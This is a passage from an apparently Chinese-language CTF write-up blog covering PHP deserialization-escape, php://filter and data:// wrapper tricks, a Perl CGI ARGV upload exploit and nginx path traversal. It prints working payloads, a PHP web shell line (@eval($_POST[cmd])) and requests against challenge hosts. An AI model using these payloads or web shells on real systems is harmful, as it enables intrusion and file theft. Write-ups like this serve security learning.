class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 若已经拥有SESSION，则把SESSION删除</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"><span class="comment"># 将全局变量$_POST解开，相当于得到$user=&#x27;guest&#x27;,$function=$function</span></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>根据代码，访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:58008&#x2F;index.php?f&#x3D;phpinfo</span><br></pre></td></tr></table></figure>
<p>可以php的配置信息，并得到flag的可能地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d0g3_f1ag.php</span><br></pre></td></tr></table></figure>
<p>那么按照常理，现在就应该是在URL上提交（GET方式）或POST数据提交，查看相关文件的操作了</p>
<p><strong>注意，此处有一个关键要点是通过post方式提交_SESSION，修改_SESSION中的参数，来实现查看文件</strong></p>
<p>根据代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br></pre></td></tr></table></figure>
<p>所以要把d0g3_f1ag.php在base64_encode后，填充入userinfo的img下标中</p>
<p>而userinfo又是由这一句得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br></pre></td></tr></table></figure>
<p>serialize_info由$SESSION得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br></pre></td></tr></table></figure>
<p>而SESSION会经过filter，且其中的img标签会被修改</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>根据wp，使用php序列化的逃逸，构成下列payload（下面有解析）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[flagflag]&#x3D;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[flagflag]&#x3D;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mbGxsbGxsYWc&#x3D;&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;cb08b7952dfbcf0ed90a8d07db20e139&#125; </span><br></pre></td></tr></table></figure>


<h2 id="php反序列化逃逸原理"><a href="#php反序列化逃逸原理" class="headerlink" title="php反序列化逃逸原理"></a>php反序列化逃逸原理</h2><p>首先序列化格式</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123; </span><br><span class="line">    [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;Hed9eh0g&quot;</span> </span><br><span class="line">    [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;aaaaa&quot;</span> </span><br><span class="line">&#125;</span><br><span class="line">序列化后会得到</span><br><span class="line"><span class="string">&#x27;a:2:&#123;i:0;s:8:&quot;Hed9eh0g&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>其次，序列化有一种特点，若在序列化过程中，有一些字符被过滤替换为空，会尝试向后读取相同位数字符。如下flag被过滤的情况</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;</span><br><span class="line">    s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;</span><br><span class="line">        s:<span class="number">24</span>:<span class="string">&quot;flagflagflagflagflagflag&quot;</span>;</span><br><span class="line">    s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;</span><br><span class="line">        s:<span class="number">59</span>:<span class="string">&quot;a&quot;</span>;</span><br><span class="line">        s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">        s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;</span><br><span class="line">        s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;</span><br><span class="line">        s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        s:20:&quot;</span>L2QwZzNfZmxsbGxsbGFn<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">a:3:&#123;</span></span><br><span class="line"><span class="string">    s:4:&quot;</span>user<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        s:24:&quot;</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">    s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;</span><br><span class="line">        s:<span class="number">59</span>:<span class="string">&quot;a&quot;</span>;</span><br><span class="line">    s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">        s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;</span><br><span class="line">        s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;</span><br><span class="line">        s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        s:20:&quot;</span>L2QwZzNfZmxsbGxsbGFn<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<p>因此，可以构造序列化字符串，绕过相关过滤</p>
<p>本题中逃逸的解析</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">未过滤前</span><br><span class="line">_SESSION[flagflag]=<span class="string">&quot;;s:3:&quot;</span>aaa<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">序列化后</span></span><br><span class="line"><span class="string">a:2:&#123;</span></span><br><span class="line"><span class="string">	s:8:&quot;</span>flagflag<span class="string">&quot;;</span></span><br><span class="line"><span class="string">	s:58:&quot;</span></span><br><span class="line">		<span class="string">&quot;;s:3:&quot;</span>aaa<span class="string">&quot;;</span></span><br><span class="line"><span class="string">		s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">		s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">	&quot;</span>;</span><br><span class="line">	s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">	s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">过滤后</span><br><span class="line">a:<span class="number">2</span>:&#123;</span><br><span class="line">	s:<span class="number">8</span>:<span class="string">&quot;&quot;</span>;</span><br><span class="line">	s:<span class="number">58</span>:<span class="string">&quot;</span></span><br><span class="line"><span class="string">		&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;aaa&quot;</span>;</span><br><span class="line">		s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">		s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line">	<span class="string">&quot;;</span></span><br><span class="line"><span class="string">	s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">	s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">反序列化填充后，再序列化时</span></span><br><span class="line"><span class="string">a:2:&#123;</span></span><br><span class="line"><span class="string">	s:8:&quot;</span>s:<span class="number">58</span>:<span class="string">&quot;&quot;</span>;<span class="string">&quot;; // 字符串里的东西随便填</span></span><br><span class="line"><span class="string">		s:3:&quot;</span>aaa<span class="string">&quot;;</span></span><br><span class="line"><span class="string">	s:3:&quot;</span>img<span class="string">&quot;;</span></span><br><span class="line"><span class="string">		s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">	&quot;</span>;</span><br><span class="line">	s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;</span><br><span class="line">	s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>


<h1 id="nizhuansiwei"><a href="#nizhuansiwei" class="headerlink" title="nizhuansiwei"></a>nizhuansiwei</h1><p>来源：2019 ZJCTF</p>
<p>考察：php反序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>很明显，需要提交text,file,password三个变量，进行绕过，回显flag</p>
<p>首先绕过text</p>
<p>尝试php://input，失败</p>
<p>使用data://text/plain，并进行base64编码</p>
<p>之后根据注释提示，读取useless.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure>
<p>以下为useless.php，给了一个类，应该为php序列化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  &#x2F;&#x2F;flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
<p>注意此时file设置为useless.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.200.241.244:59152&#x2F;index.php?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="php类的序列化代码"><a href="#php类的序列化代码" class="headerlink" title="php类的序列化代码"></a>php类的序列化代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class Flag&#123;  &#x2F;&#x2F;flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$flag &#x3D; new Flag;</span><br><span class="line">$flag-&gt;file &#x3D; &quot;flag.php&quot;;</span><br><span class="line">echo(serialize($flag));</span><br></pre></td></tr></table></figure>
<h1 id="i-got-id-200"><a href="#i-got-id-200" class="headerlink" title="i-got-id-200"></a>i-got-id-200</h1><p>来源：csaw-ctf-2016-quals</p>
<p>考察：perl文件上传</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.it610.com/article/1304921195820388352.htm">https://www.it610.com/article/1304921195820388352.htm</a></p>
<p>猜测php代码为</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> strict; <span class="comment"># 函数前言 </span></span><br><span class="line"><span class="keyword">use</span> warnings; </span><br><span class="line"><span class="keyword">use</span> CGI; <span class="comment"># 使用CGI模块</span></span><br><span class="line"><span class="keyword">my</span> $cgi= CGI-&gt;new; <span class="comment">#声明一个CGI模块</span></span><br><span class="line"><span class="keyword">if</span> ( $cgi-&gt;upload( <span class="string">&#x27;file&#x27;</span> ) )  <span class="comment"># CGI模块文件上传</span></span><br><span class="line">&#123; <span class="keyword">my</span> $file= $cgi-&gt;param( <span class="string">&#x27;file&#x27;</span> ); </span><br><span class="line"><span class="keyword">while</span> ( &lt;$file&gt; ) </span><br><span class="line">&#123; <span class="keyword">print</span> <span class="string">&quot;$_&quot;</span>; </span><br><span class="line">&#125; &#125; </span><br></pre></td></tr></table></figure>
<p>而perl文件上传存在一个漏洞，具体如下数据包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;cgi-bin&#x2F;file.pl?&#x2F;flag HTTP&#x2F;1.1</span><br><span class="line">Host: 111.200.241.244:36015</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;111.200.241.244:36015&#x2F;cgi-bin&#x2F;file.pl?&#x2F;flag</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------274822664121284</span><br><span class="line">Content-Length: 473</span><br><span class="line"></span><br><span class="line">-----------------------------274822664121284</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">ARGV</span><br><span class="line">-----------------------------274822664121284</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;1.php&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[cmd]);?&gt;</span><br><span class="line">-----------------------------274822664121284</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;Submit!&quot;</span><br><span class="line"></span><br><span class="line">Submit!</span><br><span class="line">-----------------------------274822664121284--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>注意到第一个上传文件缺少filename，这时服务器会把文件的内容（即ARGV）当做文件名（即原本的filename），而输出的文件内容为空</p>
<p>而ARGV是perl中全局特殊文件句柄（其实是内置的array变量）。具体来说，perl命令行参数列表放入ARGV中，perl会将他们作为文件进行读取。</p>
<p>ARGV文件句柄会将@ARGV中的数组存放的每一个命令行参数作为文件名，输出文件内容</p>
<p>如何传入命令行参数，在url中直接传参，即等于命令行传参</p>
<p>而bash -c的语法是，后面的第一个参数会被当做命令解析，第二、三个会当做bash的参数</p>
<p>最后的“|”操作符，是管道</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;1c465fbb33ae45724600d69fe0cc5b5d&#125;</span><br></pre></td></tr></table></figure>
<h2 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h2><h1 id="web-php-wrong-nginx-config（未做完）"><a href="#web-php-wrong-nginx-config（未做完）" class="headerlink" title="web_php_wrong_nginx_config（未做完）"></a>web_php_wrong_nginx_config（未做完）</h1><p>来源：XCTF</p>
<p>考察：</p>
<p>dirmap.py扫描</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[200][text&#x2F;html; charset&#x3D;UTF-8][15.00b] http:&#x2F;&#x2F;111.200.241.244:47566&#x2F;admin&#x2F;</span><br><span class="line">[200][text&#x2F;html; charset&#x3D;UTF-8][15.00b] http:&#x2F;&#x2F;111.200.241.244:47566&#x2F;admin&#x2F;?&#x2F;login</span><br><span class="line">[200][text&#x2F;html; charset&#x3D;UTF-8][73.00b] http:&#x2F;&#x2F;111.200.241.244:47566&#x2F;admin&#x2F;admin.php</span><br><span class="line">[200][text&#x2F;html; charset&#x3D;UTF-8][15.00b] http:&#x2F;&#x2F;111.200.241.244:47566&#x2F;admin&#x2F;index.php</span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][1.73kb] http:&#x2F;&#x2F;111.200.241.244:47566&#x2F;login.php</span><br><span class="line">[200][text&#x2F;plain][42.00b] http:&#x2F;&#x2F;111.200.241.244:47566&#x2F;robots.txt</span><br></pre></td></tr></table></figure>


<p>访问robots.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *Disallow:</span><br><span class="line"></span><br><span class="line">hint.php</span><br><span class="line">Hack.php</span><br></pre></td></tr></table></figure>
<p>hint.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">配置文件也许有问题呀：&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;site.conf</span><br></pre></td></tr></table></figure>
<p>抓包，发现cookie为isLogin=0</p>
<p>修改包为isLogin=1后，访问/admin/admin.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;admin&#x2F;admin.php?file&#x3D;index&amp;ext&#x3D;php HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
<p>有file变量，猜想文件包含</p>
<p>结合“配置文件有问题”，访问该文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;....&#x2F;&#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;site.conf&amp;ext&#x3D;</span><br></pre></td></tr></table></figure>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 